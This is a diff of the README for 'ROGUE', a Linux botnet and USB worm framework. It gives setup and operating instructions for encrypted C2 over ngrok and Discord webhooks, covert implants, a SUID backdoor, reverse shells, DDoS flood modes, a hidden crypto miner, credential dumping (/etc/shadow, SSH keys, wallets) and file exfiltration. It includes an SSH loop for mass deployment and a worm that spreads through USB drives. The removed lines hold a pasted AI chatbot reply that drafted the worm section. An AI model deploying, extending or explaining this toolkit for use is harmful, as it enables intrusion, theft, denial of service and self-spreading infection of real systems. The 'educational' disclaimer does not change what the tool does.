@@ -1,475 +1,339 @@
-
-# r0gue
+# ROGUE - Encrypted Botnet Framework
 
 ![rogue banner](https://github.com/user-attachments/assets/7dd2e5a3-398a-4487-a46b-541673b0f3b3)
 
-###  ROGUE — Fully Autonomous Botnet with AES Encryption & USB Worm Logic
+## Overview
 
-**ROGUE** is a customizable, educational, and autonomous botnet + worm framework built for multi-device coordination, payload delivery, and stealth post-exploitation via AES encryption, Discord fallback, USB-based self-replication, and anonymous tunneling through ngrok and Tor.
+ROGUE is a sophisticated encrypted command-and-control framework designed for authorized security testing and research. It features AES-256 encryption, web-based administration, Discord fallback channels, and autonomous propagation capabilities.
 
-It features:
+---
 
-*  **AES-encrypted communication** between bots and C2
-*  **Stealth Discord C2** for covert ops
-*  **Ngrok-based HTTPS payload delivery**
-*  **Peer-to-peer fallback logic** if C2 is offline
-*  **Modular payloads**: crypto mining, DDoS, exfiltration, privilege escalation
-*  **PolyRoot persistence** with SUID escalation and reverse shell callback
-*  **USB propagation**: implants infect connected USBs and spread autonomously
-*  **Built-in credential dumping**, auto-exfil, and live shell trigger support.
+## Features
+
+### Core Capabilities
+- **AES-256 Encrypted Communications** - Secure command and exfiltration channels
+- **Web-Based Administration** - Full-featured GUI control panel
+- **Dual C2 Channels** - HTTPS primary with Discord fallback
+- **Ngrok HTTPS Tunneling** - Zero-port-forwarding deployment
+- **Peer-to-Peer Bot Communication** - Bot coordination when C2 is offline
+- **Process Stealth** - Masquerades as system daemons
+
+### Payload Arsenal
+- **PolyRoot Persistence** - Privilege escalation and SUID backdoors
+- **DDoS Module** - Multi-vector attack capabilities
+- **Cryptocurrency Miner** - Silent mining operations
+- **Credential Dumper** - Automated credential collection
+- **File Exfiltration** - Encrypted data extraction
+
+### Propagation & Persistence
+- **USB Worm Logic** - Auto-infects removable drives
+- **Bashrc Persistence** - Survives reboots
+- **Hidden Execution** - Runs from `.cache/.rogue/` directory
+- **Cross-Platform Ready** - Linux/Raspberry Pi focused
 
 ---
 
 ## Installation
 
-To clone ROGUE from your Kali system:
-
+### Clone Repository
 ```bash
 git clone https://github.com/ekomsSavior/rogue.git
 cd rogue
 ```
 
-Install dependencies manually:
-
+### Install Dependencies
 ```bash
 sudo apt update
-sudo apt install python3 python3-pycryptodome
+sudo apt install python3 python3-pip python3-dev -y
+pip3 install pycryptodome flask requests
 ```
 
----
-
-## ngrok Setup
-
+### Ngrok Setup
 ```bash
 wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
 tar -xvzf ngrok-v3-stable-linux-amd64.tgz
 sudo mv ngrok /usr/local/bin/
-```
 
-Then authenticate your token: [https://ngrok.com/](https://ngrok.com/)
-
-```bash
-ngrok config add-authtoken <YOUR_NGROK_AUTH_TOKEN>
+ngrok config add-authtoken YOUR_AUTH_TOKEN
 ```
 
 ---
 
-## Tor Support (optional)
-
-```bash
-sudo apt install tor
-pip3 install pysocks
-```
-
-Start it:
-
-```bash
-sudo systemctl start tor@default
-```
-
-Check it:
-
-```bash
-sudo systemctl status tor@default
-```
-`press q to exit
-
----
-
-## File Structure
-
-| File               | Purpose                                        |
-| ------------------ | ---------------------------------------------- |
-| `rogue_c2.py`      | Encrypted command-and-control server (AES)     |
-| `rogue_implant.py` | Implant with command parsing, loader, fallback |
-| `payloads/`        | Payload modules: miner, DDoS, polyroot, more   |
-| `ngrok_loader.py`  | Automatically launches HTTPS tunnel + C2       |
-| `.cache/.rogue/`   | Hidden implant drop path on infected systems   |
-
----
-
-## Usage
-
-###  AES Key Setup
-
-Before launching anything, create a 16-byte AES key.
-
-Update the same key across both:
-
-* `rogue_c2.py`
-* `rogue_implant.py`
-
-This ensures encrypted payload and exfil transfer.
-
----
-
-## Starting ROGUE (Safe & Stealthy)
-
-NEW! Use the new ngrok loader:
-
-quick tip: if you have a paid NGROK account use the toggle in the  ngrok loader script. edit this line:
-
-```bash
-USE_NGROK_TCP = True         # ← Paid user toggle: True = use TCP for C2, False = http payloads only
-```
-
-then launch the loader.
-
-```bash
-python3 rogue_ngrok_launcher.py
-```
-
-It will:
-
-1. Launch an HTTPS tunnel to port 8000
-2. Print your payload delivery URL
-3. Start the C2 listener
-4. Output your `PAYLOAD_REPO` value to paste into implants
-
-You’ll see:
+## Architecture
 
 ```
-[*] Starting payload HTTP server on port 8000...
-[*] Launching ngrok tunnel...
-[+] Ngrok HTTPS URL: https://abc123.ngrok.io
-[*] Update your implant's PAYLOAD_REPO to use this:
-    PAYLOAD_REPO = "https://abc123.ngrok.io/"
-[*] Starting Rogue C2 now...
+rogue/
+├── rogue_c2.py              # C2 Server (Flask + AES Encryption)
+├── rogue_implant.py         # Bot Implant
+├── payloads/                # Modular payloads
+│   ├── polyloader.py       # Privilege escalation
+│   ├── ddos.py            # DDoS module
+│   ├── mine.py            # Crypto miner
+│   └── ...                # Additional payloads
+└── README.md
 ```
 
 ---
 
-###  Deploying a Bot Implant
+## Quick Start
 
-On the target system:
-
-1. Copy over `rogue_implant.py`
-2. Edit:
-
-```python
-PAYLOAD_REPO = "https://your-ngrok-url/"
-```
-
-You **do not** need to set `C2_HOST` or `C2_PORT` anymore.
-The Discord C2 loop is enabled by default inside the implant.
-It checks every 30 seconds for instructions from a private Discord channel.
-
-3. Run it:
-
-```bash
-python3 rogue_implant.py
-```
-
-The implant will:
-
- Stealth itself
- AES handshake with C2
- Log in-memory activity
- Persist to `.bashrc`
- Auto-load payloads from HTTPS
- Send alerts and exfil to Discord
-
----
-
-### NEW! Discord Webhook C2 
-
-Implants now:
-
-* **Pull commands from a private Discord channel**
-* **Exfiltrate encrypted blobs or status via Discord Webhook**
-
-All webhook logic is pre-embedded before deployment.
-
-This means:
-
- No open ports
- No exposed IPs
- Works behind NAT
- All traffic looks like normal Discord HTTPS
-
-## Edit the top of your rogue_implant.py and replace the default placeholders:
-
-```bash
-# === Discord Fallback (Optional) ===
-DISCORD_COMMAND_URL = "https://discord.com/api/v10/channels/YOUR_CHANNEL_ID/messages?limit=1"
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID"
-BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN"
-```
- What Happens After Deployment:
- 
-Implant checks the Discord channel every 30 seconds
-
-If a valid command is posted, it executes silently
-
-If exfil is triggered, an AES-encrypted blob is sent via webhook
-
-*for steps to set up your discord webhook see below
----
-
-##  Payload Arsenal
-
-Launch the C2:
-
+### 1. Start C2 Server
 ```bash
 python3 rogue_c2.py
 ```
 
-### Load a Payload:
+The server will:
+- Start ngrok HTTPS tunnel
+- Launch Flask C2 on port 4444
+- Start exfiltration listener (port 9090)
+- Start reverse shell listener (port 9001)
+- Display admin panel at `http://localhost:4444/admin`
 
+### 2. Configure Implant
+Edit `rogue_implant.py` with your ngrok URL:
+```python
+C2_HOST = 'your-ngrok-subdomain.ngrok-free.dev'
+PAYLOAD_REPO = "https://your-ngrok-subdomain.ngrok-free.dev/payloads/"
+```
+
+### 3. Deploy Implant
+Run on target system:
 ```bash
-load_payload mine.py
-run_payload mine.py
+python3 rogue_implant.py
 ```
 
 ---
 
-###  Reverse Shell
+## Web GUI Administration
 
-```bash
-reverse_shell
+### Accessing the Control Panel
+After starting the C2 server, access the web interface at:
+```
+http://localhost:4444/admin
 ```
 
-Then on your host:
+### GUI Features
+- **Real-time Bot Monitoring** - View all connected implants
+- **Command Queue Management** - Send commands to individual or all bots
+- **Result History** - View command outputs and exfiltration results
+- **Quick Command Buttons** - Common operations with one click
+- **Server Status Dashboard** - Monitor C2 server health and connections
 
+### Using the Web Interface
+1. **View Connected Bots** - See all active implants with their IP addresses and last check-in times
+2. **Send Commands** - Use the command forms to execute shell commands or trigger payloads
+3. **Monitor Results** - View command outputs in the results section
+4. **Manage Payloads** - Access payload repository from the server status section
+
+---
+
+## Encryption & Security
+
+### AES-256 Encryption
+All C2 communications are encrypted with AES-256 in EAX mode. Separate keys are used for command channels and exfiltration data. The system includes SSL/TLS bypass for ngrok compatibility.
+
+### Stealth Features
+- Process name masquerading (appears as `systemd-journald`)
+- Hidden directory operation (`~/.cache/.rogue/`)
+- Discord fallback for NAT/Firewall bypass scenarios
+- P2P bot communication as backup channel
+
+---
+
+## Payload Modules
+
+### PolyRoot Persistence
 ```bash
-nc -lvnp 9001
+# Trigger from C2
+trigger_stealthinject
+
+# Manual execution
+python3 payloads/polyloader.py
 ```
+- Attempts privilege escalation via SUID binaries
+- Drops persistent backdoor
+- Auto-connects reverse shell to C2
 
----
-
-##  Trigger Commands for c2 and discord:
-
-| Command                 | Function                       |
-| ----------------------- | ------------------------------ |
-| `trigger_mine`          | Start miner payload            |
-| `trigger_stopmine`      | Stop miner                     |
-| `trigger_ddos`          | Start DDoS                     |
-| `trigger_polyroot`      | Trigger privilege escalation   |
-| `trigger_exfil default` | Exfil common folders           |
-| `trigger_exfil deep`    | Exfil hidden targets           |
-| `trigger_exfil /path`   | Exfil custom path              |
-| `trigger_dumpcreds`     | Run internal credential dumper |
-
----
-
-##  `ddos.py` Modes
-
-Run standalone or from C2.
-
+### DDoS Module
 ```bash
-python3 ddos.py <ip> <port> <duration> <threads> <mode> [--loop]
+# C2 Command via Web GUI
+trigger_ddos <target_ip> <port> <duration>
+
+# Manual execution
+python3 payloads/ddos.py 192.168.1.100 80 300 http
 ```
+**Attack Modes:** `http`, `tls`, `udp`, `tcp`, `slowpost`, `combo`
 
-| Mode       | Description         |
-| ---------- | ------------------- |
-| `http`     | Stealth HTTP flood  |
-| `tls`      | TLS handshake flood |
-| `head`     | HEAD request spam   |
-| `ws`       | WebSocket spam      |
-| `udp`      | Random UDP blasts   |
-| `tcp`      | SYN flood           |
-| `slowpost` | Slow POST / RUDY    |
-| `combo`    | All methods at once |
-
----
-
-##  `polyroot.py` Behavior
-
-* Attempts privilege escalation on Linux
-* Obfuscates its logic
-* May install via cron
-* Can drop a root SUID backdoor
-* Auto-calls reverse shell to C2 (port 9001)
-
-**Set `ROGUE_C2_HOST` env var** to override callback destination.
-
----
-
-##  Credential Dumper
-
-Handled internally — no payload needed:
-
+### Credential Exfiltration
 ```bash
 trigger_dumpcreds
 ```
+Collects system credentials including:
+- `/etc/passwd`, `/etc/shadow`
+- SSH keys from `~/.ssh/`
+- Browser credentials
+- Wallet files
 
-It will collect:
-
-* `/etc/passwd`
-* `/etc/shadow` (if readable)
-* `.bash_history`
-* `.ssh/known_hosts`
-
-And send a zipped, AES-encrypted file back to the C2.
-It will auto-decrypt and save as:
-
+### File Exfiltration
 ```bash
-exfil_dec_<ip>_<timestamp>_creds.zip
+trigger_exfil /path/to/folder
+trigger_exfil default  # Common directories
+trigger_exfil deep     # Deep system scan
 ```
 
 ---
 
-##  Exfil Modes
+## USB Worm Propagation
 
-```bash
-trigger_exfil default
-trigger_exfil deep
-trigger_exfil /path/to/sensitive/file_or_folder
+### How It Works
+When `rogue_implant.py` detects a USB drive:
+1. Monitors `/media/`, `/run/media/`, `/mnt/` for new mounts
+2. Copies itself to USB as hidden payload
+3. Creates autorun scripts (`.bash_login`)
+4. Infects new systems when USB is plugged in
+
+### Infected USB Structure
 ```
-
-Decrypted output saved as:
-
-```bash
-exfil_dec_<ip>_<timestamp>.zip
-```
-
----
-
-## NEW! Worm Logic
-
-All implants and payloads are designed to support:
-
-* Auto-replication logic (WIP)
-* Polyroot-based SUID persistence
-* Hidden execution via `.svc`, `.update`, `.cache`
-
-Absolutely bb, here’s the full writeup for the **USB Worm Propagation** logic — written with total clarity and formatted to drop cleanly into your Rogue README under `## Worm Logic`. This honors the tone, keeps it real, and makes it clear how powerful that behavior is. Add this as a new section called:
-
----
-
-## NEW! USB Propagation Behavior (Auto-Worm Injection)
-
-When `rogue_implant.py` detects a mounted USB drive or external storage device on the host, it will attempt self-replication:
-
-** How it works:**
-
-* The implant monitors `/media`, `/mnt`, and `/run/media` for new mount points.
-* If a writable USB is detected:
-
-  1. It copies itself as a stealth payload (`update.py`, `.svc`, or similar).
-  2. Optionally drops a `readme.txt` lure to simulate a normal USB file.
-  3. Adds autorun instructions (on Windows-compatible USBs, in future versions).
-
-** What this enables:**
-
-* Infected devices become **carriers** — infecting other systems when plugged in.
-* Works seamlessly across Linux and Raspberry Pi targets.
-* Pairs perfectly with payloads like `polyroot.py` for privilege escalation after worm drop.
-* Fully autonomous — no user action required once enabled.
-
----
-
-**To test it manually:**
-
-1. Insert a USB drive into a system running an active implant.
-2. Wait \~15 seconds.
-3. Check the USB — you’ll see a stealth copy of the implant dropped there.
-
----
-
-**🛠 Future Upgrades Planned:**
-
-* Cross-OS USB detection (Windows, macOS)
-* Auto-run via LNK or hidden executable
-* USB-to-Discord exfil relays
-
----
-
-##  Testing Payload Access
-
-```bash
-curl https://your-ngrok-url/polyroot.py
-curl https://your-ngrok-url/.svc
+USB Drive/
+├── .rogue_worm/          # Hidden worm directory
+│   ├── rogue_implant.py  # Main implant
+│   └── .bash_login       # Auto-execute script
+└── readme.txt           # Decoy file
 ```
 
 ---
 
-###  DISCORD WEBHOOK Setup Guide (Bot, Webhook, and Channel)
+## Command Reference
 
-#### **1. Create a Private Discord Server**
-
-* In Discord, click the + on your server list → **"Create My Own"**
-* Name it something boring like `updates` or `infra-notify`
-
----
-
-#### **2. Create a Command Channel**
-
-* Click + next to **Text Channels** → name it something like `support`, `log`, or `news`
-* Right-click the channel → **Copy Channel ID**
-
->  **Make sure Developer Mode is enabled**
-> Go to: **Settings → Advanced → Developer Mode → Enable**
-
----
-
-#### **3. Create a Discord Bot**
-
-* Visit: [https://discord.com/developers](https://discord.com/developers)
-
-* Click **New Application** → name it `ROGUE-C2`
-
-* Go to the **Bot** tab → click **"Add Bot"** → confirm
-
-* Under **Token**, click **"Reset Token"** → **copy the Bot Token**
-
-* Under **Privileged Gateway Intents**, enable:
-
-  *  **Message Content Intent**
-  *  **Server Members Intent**
-
-* Go to **OAuth2 → URL Generator**:
-
-  * Scope: ` bot`
-  * Permissions:
-
-    *  Read Messages/View Channels
-    *  Send Messages
-    *  Embed Links
-    *  Attach Files
-  * Copy the generated URL → paste it into your browser → invite the bot to your server
-
----
-
-#### **4. Create a Webhook**
-
-* Go to your **command channel**
-* Click the gear icon → **Integrations** → **Create Webhook**
-* Name it something like `ROGUE-WEBHOOK`
-* Assign it to the same channel you created earlier
-* Click **Copy Webhook URL**
-
-## Edit the top of your rogue_implant.py and replace the default placeholders:
-
+### Basic Commands (via Web GUI)
 ```bash
-# === Discord Fallback (Optional) ===
+whoami                    # System information
+ls -la /home              # List user directories
+ip a                      # Network configuration
+ps aux                    # Running processes
+```
+
+### Payload Management
+```bash
+load_payload polyloader.py    # Download payload
+run_payload polyloader.py     # Execute payload
+trigger_mine                   # Start crypto miner
+trigger_stopmine              # Stop miner
+```
+
+### Advanced Operations
+```bash
+reverse_shell                 # Initiate reverse shell (port 9001)
+trigger_dumpcreds             # Dump and exfil credentials
+trigger_exfil /etc            # Exfiltrate specific directory
+trigger_ddos 1.2.3.4 80 60   # DDoS attack (60 seconds)
+```
+
+---
+
+## Discord C2 Setup (Fallback Channel)
+
+### Configuration
+Edit the Discord settings in `rogue_implant.py`:
+```python
 DISCORD_COMMAND_URL = "https://discord.com/api/v10/channels/YOUR_CHANNEL_ID/messages?limit=1"
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID"
-BOT_TOKEN = "YOUR_DISCORD_BOT_TOKEN"
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"
+BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
 ```
 
----
+### Discord Bot Setup
+1. Visit Discord Developer Portal and create new application
+2. Add bot with Message Content Intent enabled
+3. Copy bot token and channel ID
+4. Create webhook in your Discord channel
 
-##  Extending ROGUE
-
-* Add auto-update logic to implants
-* Integrate memory injection via C
-* Discord command filters
-* Persistence modules for Windows + macOS
-* add usb worm logic for Windows + macOS
-* Full dashboard mode with payload tracking
-
----
-
-##  Legal Disclaimer
-
-This project is for **educational purposes only**.
-Do **not** use it on any systems you don’t **own or have permission** to test.
-All code is provided **as-is**, without warranty or guarantees.
-Use it to learn, to build.
+### How Discord Fallback Works
+- Implant checks Discord channel every 30 seconds for commands
+- Commands posted in Discord are executed on all implants
+- Results are encrypted and sent back via webhook
+- Provides C2 redundancy when primary HTTPS channel is unavailable
 
 ---
 
-**R O G U E**
-Built by **ekomsSavior** 
+## Targeting & Deployment
 
+### Linux Systems
+```bash
+# Single target deployment
+scp rogue_implant.py user@target:/tmp/
+ssh user@target "python3 /tmp/rogue_implant.py"
+
+# Mass deployment via SSH
+for ip in $(cat targets.txt); do
+    scp rogue_implant.py user@$ip:/tmp/
+    ssh user@$ip "python3 /tmp/rogue_implant.py &"
+done
+```
+
+### Persistence Methods
+1. **Bashrc Injection** - Auto-starts on user login
+2. **Systemd Service** - Runs as background service (planned)
+3. **Cron Jobs** - Scheduled execution
+4. **SUID Backdoor** - Privileged persistence via polyroot
+
+---
+
+## Troubleshooting
+
+### Common Issues
+
+**Ngrok 404 Errors**
+```bash
+# Ensure ngrok is running
+ps aux | grep ngrok
+
+# Restart ngrok
+pkill ngrok
+ngrok http 4444
+```
+
+**Implant Not Connecting**
+```bash
+# Check C2_HOST in implant matches ngrok URL
+# Verify payloads directory exists
+ls payloads/
+
+# Test payload delivery
+curl https://your-ngrok.ngrok-free.dev/payloads/polyloader.py
+```
+
+**Web GUI Not Accessible**
+```bash
+# Check Flask is running on port 4444
+netstat -tlnp | grep 4444
+
+# Verify no firewall blocking
+sudo ufw status
+```
+
+### Log Locations
+- **C2 Logs**: Console output + Flask logs
+- **Implant Logs**: Console output on target systems
+- **Exfil Data**: `exfil_dec_*.zip` files in C2 directory
+- **Payloads**: `~/.cache/.rogue/` on infected systems
+
+---
+
+## Legal & Ethical Use
+
+### DISCLAIMER
+This tool is for:
+- Educational purposes only
+- Authorized security testing
+- Research and development
+- Penetration testing with explicit permission
+
+### LEGAL REQUIREMENTS
+1. Only test on systems you own or have written permission to test
+2. Comply with all applicable laws and regulations
+3. Do not use for malicious purposes
+4. Assume full responsibility for your actions
+
+---
+  
+For educational purposes only. Use responsibly.
